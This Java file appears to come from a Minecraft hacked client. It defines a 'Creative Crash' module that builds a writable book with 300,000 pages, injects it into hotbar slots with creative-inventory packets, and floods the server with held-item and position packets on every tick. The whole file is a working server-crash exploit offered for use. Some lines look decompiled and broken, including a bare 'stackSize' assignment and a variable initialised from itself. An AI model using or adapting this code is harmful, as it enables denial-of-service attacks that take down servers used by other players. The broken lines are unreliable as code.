package me.hexxed.mercury.modules;

import me.hexxed.mercury.modulebase.Module;
import me.hexxed.mercury.modulebase.ModuleCategory;
import me.hexxed.mercury.util.Util;
import net.minecraft.client.Minecraft;
import net.minecraft.client.entity.EntityPlayerSP;
import net.minecraft.client.network.NetHandlerPlayClient;
import net.minecraft.entity.player.InventoryPlayer;
import net.minecraft.item.ItemStack;
import net.minecraft.item.ItemWritableBook;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.nbt.NBTTagList;
import net.minecraft.network.Packet;
import net.minecraft.network.play.client.C03PacketPlayer;
import net.minecraft.network.play.client.C09PacketHeldItemChange;
import net.minecraft.network.play.client.C10PacketCreativeInventoryAction;

public class CreativeCrash extends Module
{
  public CreativeCrash()
  {
    super("Creative Crash", 0, true, ModuleCategory.EXPLOITS);
  }
  
  public void onEnable()
  {
    ItemStack currentEquippedItem = mc.thePlayer.inventory
      .getStackInSlot(mc.thePlayer.inventory.currentItem);
    try {
      if (!(currentEquippedItem.getItem() instanceof ItemWritableBook)) {
        Util.sendInfo("Held item not a writable book.");
        return;
      }
    } catch (NullPointerException e) {
      Util.sendInfo("Held item not a writable book.");
      return;
    }
    setBookContents(currentEquippedItem, "lol");
    stackSize = 64;
    mc.getNetHandler().addToSendQueue(
      new C10PacketCreativeInventoryAction(36, currentEquippedItem));
    mc.getNetHandler().addToSendQueue(
      new C10PacketCreativeInventoryAction(37, currentEquippedItem));
    mc.getNetHandler().addToSendQueue(
      new C10PacketCreativeInventoryAction(38, currentEquippedItem));
    mc.getNetHandler().addToSendQueue(new net.minecraft.network.play.client.C0DPacketCloseWindow(0));
  }
  
  public void onPreMotionUpdate()
  {
    Packet slot1 = new C09PacketHeldItemChange(0);
    Packet slot2 = new C09PacketHeldItemChange(1);
    Packet slot3 = new C09PacketHeldItemChange(2);
    Packet pos = new C03PacketPlayer(true);
    Packet pos2 = new C03PacketPlayer(false);
    mc.getNetHandler().addToSendQueue(slot1);
    mc.getNetHandler().addToSendQueue(pos);
    mc.getNetHandler().addToSendQueue(pos2);
    mc.getNetHandler().addToSendQueue(slot2);
    mc.getNetHandler().addToSendQueue(pos);
    mc.getNetHandler().addToSendQueue(pos2);
    mc.getNetHandler().addToSendQueue(slot3);
    mc.getNetHandler().addToSendQueue(pos);
    mc.getNetHandler().addToSendQueue(pos2);
  }
  
  private void setBookContents(ItemStack item, String username) {
    NBTTagCompound stackTagCompound = stackTagCompound == null ? new NBTTagCompound() : stackTagCompound;
    if (!stackTagCompound.hasKey("pages", 8)) {
      stackTagCompound.setTag("pages", new NBTTagList());
    }
    NBTTagList var1 = stackTagCompound.getTagList("pages", 8);
    if ((item.getItem() instanceof ItemWritableBook)) {
      for (int var2 = 0; var2 < 300000; var2++) {
        var1.getStringTagAt(var2);
        var1.appendTag(new net.minecraft.nbt.NBTTagString(username));
      }
      item.setTagInfo("pages", var1);
    }
  }
}
